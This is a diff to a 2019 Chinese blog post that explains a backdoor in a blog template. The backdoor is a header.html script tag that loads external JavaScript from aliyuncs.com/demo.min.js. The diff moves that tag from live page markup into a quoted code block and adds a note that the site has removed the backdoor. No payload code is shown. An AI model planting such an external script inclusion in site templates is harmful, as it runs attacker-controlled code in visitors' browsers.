@@ -1,15 +1,19 @@
 ---
 layout: post
 author: Vulkey_Chen
-title: "博客模板后门"
+title: "[学习转载] 为博客模板加后门"
 date: 2019-01-23
 music-id: 441491828
-permalink: /archives/2019-01-23/1
+permalink: /archives/2019-01-23/0
 description: "博客模板后门"
 ---
+# 本站已去除后门
 
 ## 在博客模板的header.html中引用了外部的JS地址
-<script src="aliyuncs.com/demo.min.js"></script><!--  https://X.com/arouline/demo.min.js -->
+
+```javascript
+<script src="aliyuncs.com/demo.min.js"></script> <!--  https://X.com/arouline/demo.min.js -->
+```
 完整代码如下：
 
 ```javascript
